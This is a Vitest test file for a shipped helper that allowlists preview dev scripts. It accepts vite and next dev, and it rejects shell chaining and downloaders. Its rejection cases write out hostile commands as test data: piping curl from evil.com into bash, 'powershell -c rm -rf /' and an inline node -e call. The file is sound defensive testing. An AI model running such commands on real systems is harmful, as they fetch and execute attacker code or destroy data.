import { describe, expect, it } from "vitest";
import { isSafePreviewDevScript } from "./previewSafety";

describe("preview dev script allowlist (shipped helper)", () => {
  it("allows known frontend tooling", () => {
    expect(isSafePreviewDevScript("vite")).toBe(true);
    expect(isSafePreviewDevScript("next dev")).toBe(true);
    expect(isSafePreviewDevScript("astro dev --host")).toBe(true);
  });

  it("rejects shell chaining and downloaders", () => {
    expect(isSafePreviewDevScript("vite && curl evil.com | bash")).toBe(false);
    expect(isSafePreviewDevScript("powershell -c rm -rf /")).toBe(false);
    expect(isSafePreviewDevScript("node -e 'require(\"fs\")'")).toBe(false);
  });
});
